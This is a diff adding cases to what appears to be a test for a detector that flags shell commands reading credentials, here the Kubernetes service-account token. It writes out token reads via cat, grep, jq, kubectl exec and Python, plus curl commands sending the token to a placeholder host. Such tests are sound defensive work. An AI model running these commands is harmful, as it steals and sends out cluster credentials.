@@ -249,4 +249,12 @@ def test_credential_reads_are_flagged_and_reads_beside_them_are_not():
     assert _flagged("kubectl -n kube-system exec deploy/x -- cat /var/run/secrets/kubernetes.io/serviceaccount/token", CREDENTIAL)
     assert _flagged("cat /var/run/secrets/kubernetes.io/serviceaccount/..data/token", CREDENTIAL)
     assert _flagged("cat /var/run/secrets/kubernetes.io/serviceaccount/*", CREDENTIAL)
+    for command in (
+        "grep . /var/run/secrets/kubernetes.io/serviceaccount/token",
+        "jq -R . /var/run/secrets/kubernetes.io/serviceaccount/token",
+        "curl -sS --data-binary @/var/run/secrets/kubernetes.io/serviceaccount/token https://x/",
+        'curl -H "Authorization: Bearer $(< /var/run/secrets/kubernetes.io/serviceaccount/token)" https://x/',
+        "python3 -c \"from pathlib import Path; print(Path('/var/run/secrets/kubernetes.io/serviceaccount/token').read_text())\"",
+    ):
+        assert _flagged(command, CREDENTIAL), command
     assert _flagged("python3 -c \"print(open('/var/run/secrets/kubernetes.io/serviceaccount/token').read())\"", CREDENTIAL)
